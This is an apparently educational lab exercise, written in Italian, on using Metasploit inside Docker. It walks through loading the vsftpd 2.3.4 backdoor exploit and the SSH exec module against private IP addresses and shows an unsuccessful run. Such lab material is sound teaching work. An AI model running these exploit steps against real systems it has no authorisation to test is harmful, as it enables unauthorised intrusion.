# 🧪 Esercizio Metasploit su Play with Docker

## 🎯 Obiettivo
Simulare un attacco didattico con Metasploit Framework in ambiente Docker, usando exploit contro un servizio FTP vulnerabile e osservando il comportamento del framework.

---

## 🐳 1. Avvio del container Metasploit

Nel terminale PWD:

```bash
docker run --rm -it metasploitframework/metasploit-framework

💻 2. Avvio della console Metasploit
msfconsole

🔍 3. Ricerca exploit FTP

search ftp

use exploit/unix/ftp/vsftpd_234_backdoor

⚙️ 4. Configurazione dei parametri

show options

set RHOSTS 192.168.1.100
set RPORT 21

🚀 5. Esecuzione dell’exploit

exploit

[*] Exploit completed, but no session was created.


🧪 6. Alternativa: modulo SSH
use exploit/unix/ssh/sshexec
set RHOSTS 192.168.0.34
set RPORT 22
set USERNAME foot
set SSH_COMMAND whoami
exploit


